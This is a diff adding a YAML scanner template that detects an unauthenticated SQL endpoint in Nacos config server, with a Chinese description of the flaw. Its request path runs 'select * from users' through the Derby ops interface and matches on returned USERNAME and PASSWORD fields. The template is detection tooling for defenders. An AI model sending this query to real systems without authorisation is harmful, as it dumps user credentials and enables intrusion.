@@ -1,0 +1,28 @@
+# 来源: afrog（转换自 afrog/xray 表达式 POC）
+http:
+  - matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - '"code":'
+          - '"USERNAME":'
+          - '"PASSWORD":'
+        condition: and
+    method: GET
+    path:
+      - '{{BaseURL}}/nacos/v1/cs/ops/derby?sql=select%20*%20from%20users%20'
+id: nacos-config-server-sql-inject
+info:
+  author: zan8in
+  description: Nacos config server中有个接口，没有做任何的鉴权，即可执行sql语句，可以泄漏全部数据
+  metadata:
+    argus-execution-class: detection
+    argus-import-license: MIT License
+    argus-import-source: afrog
+    argus-risk-level: high
+  name: Naocos Config Server SQL injection
+  severity: high
+  tags: nacos,sqli,argus-import
